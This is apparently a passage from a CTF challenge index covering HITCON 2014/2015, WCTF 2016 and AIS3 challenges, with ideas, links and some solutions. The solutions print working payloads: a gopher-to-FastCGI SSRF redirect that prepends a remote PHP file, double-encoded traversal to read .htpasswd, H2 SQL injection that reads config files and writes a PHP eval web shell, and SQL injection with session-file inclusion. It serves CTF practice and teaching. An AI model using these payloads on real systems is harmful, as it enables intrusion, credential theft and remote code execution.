* [babyfirst (web 100)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md)  
* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
* [HITCON 2015 Quals: Babyexploit](https://kt.pe/blog/2015/10/hitcon-2015-quals-babyexploit/)  
* [Babyfirst (web, 100p, ?? solves)](https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst#eng-version)  



## **nanana**

Difficulty: **★★★**  
Solved: **18 / 969**  
Tag: **GrayBox**, **C**, **PWN**  

#### Idea
* Pwn without library  
* Format String without output  
* Bypass Stack Guard by using overflow `ARGV[1]`  

#### Source Code

* [here](hitcon-ctf-2015/nanana/)  

#### Solution  

* [exploit.py](hitcon-ctf-2015/nanana/exploit.py)  

#### Write Ups

* [nanana (pwn, web 200)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web200-nanana/writeup.md)  
* [HITCON 2015 Quals: Nanana](https://kt.pe/blog/2015/10/hitcon-2015-quals-nanana/)  
* [Pwning (sometimes) with style - Dragons’ notes on CTFs](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)  


## **Giraffe's Coffee**

Difficulty: **★★★☆**  
Solved: **16 / 969**  
Tag:  **WhiteBox**, **PHP**  

#### Idea
* Break PHP PRNG  
* Break shared PRNG STATE in Apache Prefork mode  

#### Source Code

* [here](hitcon-ctf-2015/giraffe's-coffee)  

#### Solution  

    TBD

#### Write Ups

* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)
* [Giraffe's Coffee - Web 300 Problem - Writeup by Robert Xiao (@nneonneo)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web300-giraffes-coffee/readme.md)
* [HITCON 2015 WEB 300](https://docs.google.com/document/d/1NlCF4jykgwuUMkr0I8HjbLRUKNAGf6jzRiI2D9TyumA/edit)


## **lalala**

Difficulty: **★★★☆**  
Solved: **2 / 969**  
Tag: **BlackBox**, **PHP**, **SSRF**  

#### Idea

* Bypass SSRF restrictiton with 302 redirect  
* Exploit FASTCGI protocol by using GOPHER  

#### Source Code  

* [here](hitcon-ctf-2015/lalala)  

#### Solution    

```php
<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%86%00%00%0E%03REQUEST_METHODGET%0F%0ASCRIPT_FILENAME/www/a.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );
```

#### Write Ups  

* [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
* [Hitcon 2015 lalala web400 task](https://docs.google.com/document/d/1eALKwCyogM5Mw_D4qWe48X-PAGZw_2vT82aP0EPIr-8/mobilebasic?pli=1)  


## **Use-After-FLEE**  

Solved: **1 / 969**  
Difficulty: **★★★★☆**  
Tag: **WhiteBox**, **PHP**, **UAF**, **PWN**  

#### Idea

* Bypass open_basedir  
* Bypass disable_functions  
* PHP use-after-free exploit writing  
* Bypass full protection (DEP / ASLR / PIE / FULL RELRO)  
* [Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList](https://github.com/80vul/phpcodz/blob/master/research/pch-034.md)  

#### Source Code  

* [here](hitcon-ctf-2015/use-after-flee)  

#### Solution    

    TBD

#### Write Ups

* [Use-After-FLEE (pwn, web 500)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md)


## **PUSHIN CAT**

Solved: **8 / 1020**  
Difficulty: **★★**  
Platform:  **BlackBox**, **PHP**, **H2**, **SQL Injection**  

#### Idea  

* SQL Injection on H2 Database  
* Execute Code by using H2 SQL Injection  

#### Source Code

* [here](hitcon-ctf-2014/pushincat)    

#### Solution  

    TBD

#### Write Ups

* [HITCON CTF 2014: PUSHIN CAT](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/pushin-cat)
* [HITCON CTF 2014 - PUSHIN CAT (H2 DB Insert SQL Injection)](https://www.youtube.com/watch?v=KNs5ZZo31P8)
* [HITCON CTF 2014](http://mage-ctf-writeup.blogspot.tw/2014/08/hitcon-ctf-2014.html)


## **PY4H4SHER**

Solved: **30 / 1020**  
Difficulty: **★★☆**  
Tag: **WhiteBox**, **Python**, **Collision**, **HPP**  

#### Idea

* Python CGI HTTP Pollution  
* MySQL old_password hash collisions  
* [PBKDF2+HMAC hash collisions explained](https://mathiasbynens.be/notes/pbkdf2-hmac)  

#### Source Code  

* [here](hitcon-ctf-2014/py4h4sher)  

#### Solution    

    TBD  

#### Write Ups  

* [HITCON CTF 2014: PY4H4SHER](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/py4h4sher)  
* [HITCON CTF 2014: PY4H4SHER WRITEUP](http://blog.st3phn.com/2014/08/hitcon-ctf-2014-py4h4sher-writeup.html)  
* [py4h4sher_solution.py](http://pastebin.com/DCbJ0qzi)  
* [HITCON CTF 2014](http://mage-ctf-writeup.blogspot.tw/2014/08/hitcon-ctf-2014.html)  


## **LEENODE**  

Solved: **2 / 1020**  
Difficulty: **★★★**  
Tag: **BlackBox**, **ColdFusion**, **Apache**  

#### Idea  

* Multilayered architecture vulnerability  
* Double Encoding  

#### Source Code  

* [here](hitcon-ctf-2014/leenode)  

#### Solution  

```bash
# get password
$ curl http://1.2.3.4/admin%252f%252ehtpasswd%2500.cfm

# get flag
$ curl http://1.2.3.4/admin/thefl4g.txt 

```

#### Write Ups  

* [HITCON CTF 2014: LEENODE](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/leenode)  
* [(web) LEENODE [250]](http://cdepillabout.github.io/ctf/2014/hitcon/leenode/writeup.html)  
* [CTF/Writeup/HITCON2014/LEENODE](https://wiki.mma.club.uec.ac.jp/CTF/Writeup/HITCON2014/LEENODE)  


## **BlackBox**

Solved: **0 / 12**  
Difficulty: **★★★★**  
Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**, **WAF**  

#### Idea  

* Multilayered architecture vulnerability  
* Default and up to date mod_jk leads to directory travesal  
* Bypass WAF by incorrect usage of BASE64 and URLENCODE  
* SQL Injection on H2 Database  
* Execute Code by using H2 SQL Injection  

#### Source Code  

* [here](wctf-2016/BlackBox)  

#### Solution  

* Get source code  
   ```text
   http://1.2.3.4/login/..;/
   ```

* Review code and find a way to bypass WAF  
   ```bash
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,version(),null--"
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_read('/etc/apache2/sites-enabled/000-default.conf'),null--"
   ```  

* Write shell  
    ```bash
    $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_write('3c3f706870206576616c28245f504f53545b6363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null--"
    $ curl "http://1.2.3.4/write_shell_here_=P/.a.php" -d 'phpinfo();'
    ```

#### Write Ups  

    TBD



## **SQLPWN**  

Solved: **0 / ??**  
Difficulty: **★★★**  
Tag: **WhiteBox**, **PHP**, **SQL Injection**, **LFI**, **Race Condition**  

#### Idea  

* One-byte off SQL Injection  
* Race Condition  
* Local file inclusion with PHP session  

#### Source Code  

* [here](ais3-final-2015/sqlpwn)  

#### Solution  

* Run [exploit.py](ais3-final-2015/sqlpwn/exploit.py) to win race condition

* Login and SQL Injection

   ```bash
   $ curl http://1.2.3.4/sqlpwn.php -d 'title=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\&note=, concat(0x3a3a3a3a3a3a,(select pass from users where name=0x6f72616e6765)))#'
   ```

* Local file inclusion with session
   ```bash
   $ curl http://1.2.3.4/sqlpwn.php?mode=admin&boom=../../../../../../var/lib/php5/sess_243220
   ```  

#### Write Ups  

* [AIS3 Final CTF Web Writeup (Race Condition & one-byte off SQL Injection)](http://blog.orange.tw/2015/09/ais3-final-ctf-web-writeup-race.html)  
* [AIS3 CTF Final Web1 & Web2](https://docs.google.com/document/d/1n-8LHsxJ6o1-Pr1ISKYyopcfLoUIQcF5CcZGl7KLbPY/edit)  



